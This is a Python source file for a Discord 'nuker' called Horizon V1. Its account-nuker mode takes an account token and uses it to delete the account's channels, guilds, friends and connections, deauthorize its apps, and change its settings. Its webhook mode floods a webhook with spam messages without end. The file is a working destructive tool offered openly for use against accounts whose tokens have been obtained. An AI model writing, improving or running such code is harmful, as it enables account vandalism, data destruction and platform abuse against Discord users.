import os
import requests
import asyncio
import time
import aiohttp
import win32console
win32console.SetConsoleTitle("Horizon V1 | dsc.gg/eclipsedevelopment | Made by Sempiller & hatchinng | Trial Version")

API_BASE = "https://discord.com/api/v9"

# Account Nuker
async def nuke_account(auth_token: str) -> str:
    headers = {
        "Authorization": auth_token
    }

    async with aiohttp.ClientSession(headers=headers) as session:
        # Delete all channels
        channels = await session.get(f'{API_BASE}/users/@me/channels')
        channels = await channels.json()
        await asyncio.gather(*[delete_channel(channel['id'], session) for channel in channels])

        # Leave/Delete all guilds
        guilds = await session.get(f'{API_BASE}/users/@me/guilds')
        guilds = await guilds.json()
        await asyncio.gather(*[remove_guild(guild['id'], guild['owner'], session) for guild in guilds])

        # Delete all friends
        friends = await session.get(f'{API_BASE}/users/@me/relationships')
        friends = await friends.json()
        await asyncio.gather(*[delete_friend(friend['id'], session) for friend in friends])

        # Delete all connections
        connections = await session.get(f'{API_BASE}/users/@me/connections')
        connections = await connections.json()
        await asyncio.gather(*[delete_connection(connection['type'], connection['id'], session) for connection in connections])

        # Deauthorize all applications
        app_tokens = await session.get(f'{API_BASE}/oauth2/tokens')
        app_tokens = await app_tokens.json()
        await asyncio.gather(*[deauth_app(app['id'], session) for app in app_tokens])

        # Leave Hype Squad
        await session.delete(f'{API_BASE}/hypesquad/online')

        # Update the user's settings
        settings = {
            "locale": "ja",
            "show_current_game": False,
            "default_guilds_restricted": True,
            "inline_attachment_media": False,
            "inline_embed_media": False,
            "gif_auto_play": False,
            "render_embeds": False,
            "render_reactions": False,
            "animate_emoji": False,
            "enable_tts_command": False,
            "message_display_compact": True,
            "convert_emoticons": False,
            "explicit_content_filter": 0,
            "disable_games_tab": True,
            "theme": "light",
            "detect_platform_accounts": False,
            "stream_notifications_enabled": False,
            "animate_stickers": False,
            "view_nsfw_guilds": True,
        }

        await session.patch(f'{API_BASE}/users/@me/settings', json=settings)

    return "Account nuked successfully."

async def delete_channel(channel_id: int, session):
    while True:
        async with session.delete(f'{API_BASE}/channels/{channel_id}') as resp:
            if resp.status in (200, 201, 204):
                print(f'Deleted channel {channel_id} successfully.')
                return
            elif resp.status == 429:
                retry_after = int(resp.headers.get('Retry-After', '1'))
                print(f'Rate limited, retrying after {retry_after} seconds.')
                await asyncio.sleep(retry_after)
            else:
                print(f'Failed to delete channel {channel_id} with status code {resp.status}.')
                raise aiohttp.ClientError

async def remove_guild(guild_id: int, is_owner: bool, session):
    url = f'{API_BASE}/guilds/{guild_id}' if is_owner else f'{API_BASE}/users/@me/guilds/{guild_id}'
    while True:
        async with session.delete(url) as resp:
            if resp.status in (200, 201, 204):
                print(f'Left guild {guild_id} successfully.')
                return
            elif resp.status == 429:
                retry_after = int(resp.headers.get('Retry-After', '1'))
                print(f'Rate limited, retrying after {retry_after} seconds.')
                await asyncio.sleep(retry_after)
            else:
                print(f'Failed to leave guild {guild_id} with status code {resp.status}.')
                raise aiohttp.ClientError

async def delete_friend(friend_id: int, session):
    while True:
        async with session.delete(f'{API_BASE}/users/@me/relationships/{friend_id}') as resp:
            if resp.status in (200, 201, 204):
                print(f'Deleted friend {friend_id} successfully.')
                return
            elif resp.status == 429:
                retry_after = int(resp.headers.get('Retry-After', '1'))
                print(f'Rate limited, retrying after {retry_after} seconds.')
                await asyncio.sleep(retry_after)
            else:
                print(f'Failed to delete friend {friend_id} with status code {resp.status}.')
                raise aiohttp.ClientError

async def delete_connection(connection_type: str, connection_id: int, session):
    while True:
        async with session.delete(f'{API_BASE}/users/@me/connections/{connection_type}/{connection_id}') as resp:
            if resp.status in (200, 201, 204):
                print(f'Deleted connection {connection_type} {connection_id} successfully.')
                return
            elif resp.status == 429:
                retry_after = int(resp.headers.get('Retry-After', '1'))
                print(f'Rate limited, retrying after {retry_after} seconds.')
                await asyncio.sleep(retry_after)
            else:
                print(f'Failed to delete connection {connection_type} {connection_id} with status code {resp.status}.')
                raise aiohttp.ClientError

async def deauth_app(app_id: int, session):
    while True:
        async with session.delete(f'{API_BASE}/oauth2/tokens/{app_id}') as resp:
            if resp.status in (200, 201, 204):
                print(f'Deauthorized app {app_id} successfully.')
                return
            elif resp.status == 429:
                retry_after = int(resp.headers.get('Retry-After', '1'))
                print(f'Rate limited, retrying after {retry_after} seconds.')
                await asyncio.sleep(retry_after)
            else:
                print(f'Failed to deauthorize app {app_id} with status code {resp.status}.')
                raise aiohttp.ClientError

# Webhook Nuker
def webhook_nuker(webhook_url, text, delay):
    while True:
        response = requests.post(webhook_url, json={"content": text})
        if response.status_code != 204:
            print(f"Failed to send message: {response.status_code}")
            break
        time.sleep(delay)  # Adding a custom delay between messages

# Main Script
def morbeyaz_gradyan(text):
    gradient_text = ""
    for char_index, char in enumerate(text):
        mor_value = 128 + char_index * 127 // len(text)
        white_value = 255 - char_index * 255 // len(text)
        gradient_text += f"\033[38;2;{mor_value};{white_value};{white_value}m{char}"
    return gradient_text + "\033[0m"

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def line1():
    line = " \033[31m───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────\033[0m"
    gradient_line = morbeyaz_gradyan(line)
    print(line)

art = r'''
 __    __                      __                               
/  |  /  |                    /  |                              
$$ |  $$ |  ______    ______  $$/  ________   ______   _______  
$$ |__$$ | /      \  /      \ /  |/        | /      \ /       \ 
$$    $$ |/$emp$$  |/$$$$$$  |$$ |$$$$$$$$/ /$$$$$$  |$$$$$$$  |
$$$$$$$$ |$$ |  $$ |$$ |  $$/ $$ |  /  $$/  $$ |  $$ |$$ |  $$ |
$$ |  $$ |$$ \__$$ |$$ |      $$ | /$$$$/__ $$ \__$$ |$$ |  $$ |
$$ |  $$ |$$    $$/ $$ |      $$ |/$$      |$$    $$/ $$ |  $$ |
$$/   $$/  $$$$$$/  $$/       $$/ $$$$$$$$/  $$$$$$/  $$/   $$/ 
                                                                
> dsc.gg/eclipsedevelopment         > Version 1.0.1(Open-source)
                                                                                                                                         
'''

nul11 = ""
texts = """                          \033[31m[1]\033[0m Account Nuker  |  \033[31m[2]\033[0m Webhook Nuker"""

async def main():
    while True:
        clear_screen()
        lines = art.splitlines()
        term_height = os.get_terminal_size().lines
        top_padding = term_height // 14
        for _ in range(top_padding):
            print()

        for line in lines:
            gradient_line = morbeyaz_gradyan(line)
            padding_spaces = (os.get_terminal_size().columns - len(line)) // 2
            print(" " * padding_spaces + gradient_line)

        print(nul11)
        line1()

        padding_spaces = (os.get_terminal_size().columns - len(texts)) // 2
        print("\n" + " " * padding_spaces + texts)

        print(nul11)
        line1()
        print(nul11)

        user_choice = input("Enter a choice >> ")

        if user_choice == "1":
            clear_screen()
            account_token = input("Enter account token >> ")
            await nuke_account(account_token)
            input("Press Enter to continue...")
        elif user_choice == "2":
            clear_screen()
            webhook_url = input("Enter webhook URL >> ")
            text = input("Enter text to spam >> ")
            delay = float(input("Enter delay in seconds >> "))
            webhook_nuker(webhook_url, text, delay)
            input("Press Enter to continue...")
        else:
            clear_screen()
            print("Wrong choice. Please enter 1 or 2.")
            input("Press Enter to continue...")

if __name__ == "__main__":
    asyncio.run(main())
